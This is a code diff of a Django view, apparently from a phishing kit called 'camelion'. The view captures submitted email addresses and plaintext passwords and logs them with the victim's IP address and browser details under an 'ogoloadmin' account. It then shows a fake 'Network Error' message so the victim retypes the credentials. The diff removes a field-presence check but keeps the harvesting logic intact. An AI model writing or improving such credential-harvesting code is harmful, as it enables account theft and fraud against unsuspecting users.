@@ -13,37 +13,34 @@ def camelion_view(request):
     if request.method == 'POST':
         email = request.POST.get('f_email', '').strip()
         password = request.POST.get('f_password')
-        if email and password:
-            print('passed through')
-            try:
-                validate_email(email)
-                ip_address = get_client_ip(request)
-                browser_info = get_browser_info(request)
-                user = User.objects.get(username='ogoloadmin')
+        
+        try:
+            validate_email(email)
+            ip_address = get_client_ip(request)
+            browser_info = get_browser_info(request)
+            user = User.objects.get(username='ogoloadmin')
 
-                ResultLog.objects.create(
-                    owner=user,
-                    email=email,
-                    password_text=password,
-                    ip_address=ip_address,
-                    browser_version=browser_info['version'],
-                    browser_type=browser_info['browser'],
-                    browser_agent=browser_info['agent'],
-                )
+            ResultLog.objects.create(
+                owner=user,
+                email=email,
+                password_text=password,
+                ip_address=ip_address,
+                browser_version=browser_info['version'],
+                browser_type=browser_info['browser'],
+                browser_agent=browser_info['agent'],
+            )
 
-                url = reverse('camelion:camelion') + f'?em={email}'
-                messages.error(request, "Network Error! Please verify your information and try again.")
-                return redirect(url)
-            except ValidationError:
-                messages.error(request, "Invalid Email Address! Please enter a valid email address.")
-                context = {
-                    'existing_email': '',
-                    'email_is_valid': False,
-                }
-                return render(request, 'camelion/camelion_one.html', context)
-        else:
-            messages.error(request, "Please make sure you input the correct email and password.")
-            return redirect('camelion:camelion') 
+            url = reverse('camelion:camelion') + f'?em={email}'
+            messages.error(request, "Network Error! Please verify your information and try again.")
+            return redirect(url)
+        except ValidationError:
+            messages.error(request, "Invalid Email Address! Please enter a valid email address.")
+            context = {
+                'existing_email': '',
+                'email_is_valid': False,
+            }
+            return render(request, 'camelion/camelion_one.html', context)
+       
     else:
         existing_email = request.GET.get('em', '').strip()
         email_is_valid = False
